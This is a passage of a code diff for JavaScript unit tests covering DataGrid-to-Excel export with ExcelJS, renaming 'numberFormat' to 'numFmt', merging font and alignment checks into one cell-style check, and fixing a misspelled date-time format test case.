 
 
@@ -1703,8 +1664,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 1 }, { row: 3, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 2, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -1725,7 +1685,7 @@ const moduleConfig = {
                 }],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
 
@@ -1758,14 +1718,14 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: '', type: ExcelJS.ValueType.String, dataType: 'string', numberFormat: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: '', type: ExcelJS.ValueType.String, dataType: 'string', numFmt: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
                 { excelCell: { value: ds[0].f2, type: ExcelJS.ValueType.Null, dataType: 'object' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f4, rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f4, rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -1773,8 +1733,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 3 }, { row: 1, column: 4 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1804,12 +1763,12 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]d-M-yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]d+M+yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } }
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]d-M-yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]d+M+yyyy', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -1817,8 +1776,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 2 }, { row: 1, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1843,7 +1801,7 @@ const moduleConfig = {
             { format: 'shortDate', expectedFormat: '[$-9]M\\/d\\/yyyy' },
             { format: 'shortTime', expectedFormat: '[$-9]H:mm AM/PM' },
             { format: 'longDateLongTime', expectedFormat: '[$-9]dddd, MMMM d, yyyy, H:mm:ss AM/PM' },
-            { format: 'shotDateShortTime', expectedFormat: '[$-9]ssAM/PMSS\\o\\r\\t\\T\\im\\e' },
+            { format: 'shortDateShortTime', expectedFormat: '[$-9]M\\/d\\/yyyy, H:mm AM/PM' },
             { format: 'longDate', expectedFormat: '[$-9]dddd, MMMM d, yyyy' },
             { format: 'longTime', expectedFormat: '[$-9]H:mm:ss AM/PM' },
             { format: 'dayOfWeek', expectedFormat: '[$-9]dddd' },
@@ -1865,11 +1823,11 @@ const moduleConfig = {
                         columns: [{ dataField: 'f1', dataType: 'datetime', format: format.format }],
                         dataSource: ds,
                         showColumnHeaders: false,
-                        loadingTimeout: undefined
+                        loadingTimeout: null
                     }).dxDataGrid('instance');
 
                     const expectedCells = [[
-                        { excelCell: { value: date.expectedExcelCellValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: format.expectedFormat, alignment: alignLeftTopNoWrap }, gridCell: { value: date.expectedGridCellValue, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                        { excelCell: { value: date.expectedExcelCellValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: format.expectedFormat, alignment: alignLeftTopNoWrap }, gridCell: { value: date.expectedGridCellValue, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
                     ]];
 
                     helper._extendExpectedCells(expectedCells, topLeft);
@@ -1877,8 +1835,7 @@ const moduleConfig = {
                     exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                         helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                         helper.checkAutoFilter(autoFilterEnabled, null);
-                        helper.checkFont(expectedCells);
-                        helper.checkAlignment(expectedCells);
+                        helper.checkCellStyle(expectedCells);
                         helper.checkValues(expectedCells);
                         helper.checkMergeCells(expectedCells, topLeft);
                         helper.checkOutlineLevel([0], topLeft.row);
@@ -1905,14 +1862,14 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: '', type: ExcelJS.ValueType.String, dataType: 'string', numberFormat: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: '', type: ExcelJS.ValueType.String, dataType: 'string', numFmt: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f1, rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
                 { excelCell: { value: ds[0].f2, type: ExcelJS.ValueType.Null, dataType: 'object' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numberFormat: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f4, rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f3, rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: expectedExcelDateValue, type: ExcelJS.ValueType.Date, dataType: 'object', numFmt: '[$-9]M\\/d\\/yyyy, H:mm AM/PM', alignment: alignLeftTopNoWrap }, gridCell: { value: ds[0].f4, rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -1920,8 +1877,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 3 }, { row: 1, column: 4 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1948,7 +1904,7 @@ const moduleConfig = {
                 }],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1976,7 +1932,7 @@ const moduleConfig = {
                     dataType: 'object'
                 }],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1990,8 +1946,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -2014,22 +1969,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'percent', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.000%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.000000%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.000%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.0%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.000000%', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2052,22 +2007,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'fixedPoint', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2090,22 +2045,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'decimal', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#000000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#0', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#000000', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2128,22 +2083,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'exponential', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.000E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '0.000000E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.000E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.0E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '0.000000E+00', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2166,22 +2121,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'largeNumber', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: undefined, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2204,22 +2159,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'thousands', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000000,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.0,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
+                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numFmt: '#,##0.000000,"K"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 5 }, { row: 1, column: 5 }, topLeft);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -2242,22 +2197,22 @@ const moduleConfig = {
                     { dataField: 'f5', dataType: 'number', format: { type: 'millions', precision: 6 } },
                 ],
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0.000,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f1, type: ExcelJS.ValueType.Number, dataType: 'number', numberFormat: '#,##0,,"M"', alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
